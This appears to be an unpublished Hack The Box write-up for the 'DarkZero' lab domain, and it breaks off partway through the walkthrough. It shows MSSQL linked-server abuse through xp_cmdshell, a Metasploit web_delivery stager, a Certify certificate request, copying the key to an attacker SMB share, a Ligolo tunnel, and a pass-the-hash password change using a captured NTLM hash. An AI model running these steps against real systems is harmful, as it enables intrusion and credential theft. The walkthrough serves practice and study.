---
layout: post
title: "HTB - DarkZero"
categories: [writeup]
published: false
---

**Machine Information**

As is common in real life pentests, you will start the DarkZero box with credentials for the following account john.w / RFulUtONCOL!

### **1. Walkthrough**

```
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-03-17 22:04:17Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: darkzero.htb, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.darkzero.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.darkzero.htb
| Not valid before: 2025-07-29T11:40:00
|_Not valid after:  2026-07-29T11:40:00
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: darkzero.htb, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.darkzero.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.darkzero.htb
| Not valid before: 2025-07-29T11:40:00
|_Not valid after:  2026-07-29T11:40:00
1433/tcp open  ms-sql-s      Microsoft SQL Server 2022 16.00.1000.00; RTM
| ms-sql-info:
|   10.129.6.22:1433:
|     Version:
|       name: Microsoft SQL Server 2022 RTM
|       number: 16.00.1000.00
|       Product: Microsoft SQL Server 2022
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
|_ssl-date: 2026-03-17T22:05:38+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2026-03-17T21:56:07
|_Not valid after:  2056-03-17T21:56:07
| ms-sql-ntlm-info:
|   10.129.6.22:1433:
|     Target_Name: darkzero
|     NetBIOS_Domain_Name: darkzero
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: darkzero.htb
|     DNS_Computer_Name: DC01.darkzero.htb
|     DNS_Tree_Name: darkzero.htb
|_    Product_Version: 10.0.26100
2179/tcp open  vmrdp?
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: darkzero.htb, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.darkzero.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.darkzero.htb
| Not valid before: 2025-07-29T11:40:00
|_Not valid after:  2026-07-29T11:40:00
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: darkzero.htb, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.darkzero.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.darkzero.htb
| Not valid before: 2025-07-29T11:40:00
|_Not valid after:  2026-07-29T11:40:00
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2026-03-17T22:04:58
|_  start_date: N/A
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
```

Starting with credentials for john.w@darkzero.htb, we authenticate to the MSSQL instance on DC01.

```bash
mssqlclient.py 'john.w:RFulUtONCOL!@dc01.darkzero.htb' -windows-auth
```

We find a link to the external forest DC02.darkzero.ext.

```bash
SQL (darkzero\john.w  guest@master)> enum_links
SRV_NAME            SRV_PROVIDERNAME   SRV_PRODUCT   SRV_DATASOURCE      SRV_PROVIDERSTRING   SRV_LOCATION   SRV_CAT
-----------------   ----------------   -----------   -----------------   ------------------   ------------   -------
DC02.darkzero.ext   SQLNCLI            SQL Server    DC02.darkzero.ext   NULL                 NULL           NULL
```

We can execute commands on the linked server by enabling xp_cmdshell.

```bash
SQL >"DC02.darkzero.ext" (dc01_sql_svc  dbo@master)> enable_xp_cmdshell
INFO(DC02): Line 196: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
INFO(DC02): Line 196: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL >"dc02.darkzero.ext" (dc01_sql_svc  dbo@master)> xp_cmdshell whoami /priv
Privilege Name                Description                    State
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeCreateGlobalPrivilege       Create global objects          Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

We detect a backup of the policy, which shows that the service account will have SeImpersonatePrivilege.

```bash
SQL >"dc02.darkzero.ext" (dc01_sql_svc  dbo@master)> xp_cmdshell type C:\Policy_Backup.inf
SeImpersonatePrivilege = *S-1-5-19,*S-1-5-20,*S-1-5-32-544,*S-1-5-6
SQL >"DC02.darkzero.ext" (dc01_sql_svc  dbo@master)> xp_cmdshell whoami /groups
Group Name                                 Type             SID                                                             Attributes
========================================== ================ =============================================================== ==================================================
NT AUTHORITY\SERVICE                       Well-known group S-1-5-6                                                         Mandatory group, Enabled by default, Enabled group
```

But since our session is only a network logon, this permission isn't visible.

Further inspection reveals that the ADCS service is running on DC02. We can leverage this by using Certify.exe to request a certificate, which allows us to authenticate and retrieve the NTLM hash for svc_sql. After establishing a tunnel via Ligolo-ng, we use runascs to obtain an interactive session. This provides us with SeImpersonatePrivilege, which we can then exploit using GodPotato to gain full Administrator access.

```bash
SQL >"dc02.darkzero.ext" (dc01_sql_svc  dbo@master)> xp_cmdshell powershell ps
Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
    446      34    12980      12784               736   0 certsrv
```

```bash
msf exploit(multi/script/web_delivery) > run
[*] Run the following command on the target machine:
powershell.exe -nop -w hidden -e ...
```

```powershell
C:\Users\Public>powershell
PS C:\Users\Public> $output = .\Certify.exe request /ca:localhost\DARKZERO-EXT-DC02-CA /template:User
PS C:\Users\Public> $output | Out-File -FilePath "cert.txt" -Encoding ascii
```

```powershell
$content = Get-Content "cert.txt" -Raw
$pattern = "(?s)-----BEGIN RSA PRIVATE KEY-----.*?-----END CERTIFICATE-----"
if ($content -match $pattern) {
    $matches[0] | Out-File -FilePath "cert.pem" -Encoding ascii
    Write-Host "[+] Extracted to cert.pem!" -ForegroundColor Green
} else {
    Write-Host "[-] Certificate/Key not found!" -ForegroundColor Red
}
```

```bash
sudo smbserver.py share $(pwd) -smb2support -user luverie -password luverie
```

```powershell
PS C:\Users\Public> net use Z: \\10.10.15.12\share /user:luverie luverie
PS C:\Users\Public> move cert.pem \\10.10.15.12\share
```

```bash
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```

```bash
ligolo-ng » INFO[0021] Agent joined.                                 id=00155df25c01 name="darkzero-ext\\svc_sql@DC02" remote="10.129.6.37:52479"
[Agent : darkzero-ext\svc_sql@DC02] » start
INFO[0029] Starting tunnel to darkzero-ext\svc_sql@DC02 (00155df25c01
```

```bash
[*] Got hash for 'svc_sql@darkzero.ext': aad3b435b51404eeaad3b435b51404ee:816ccb849956b531db139346751db65f

changepasswd.py svc_sql@darkzero.ext -hashes :816ccb849956b531db139346751db65f -newpass Password123 -dc-ip 172.16.20.2
[*] Password was changed successfully.
```
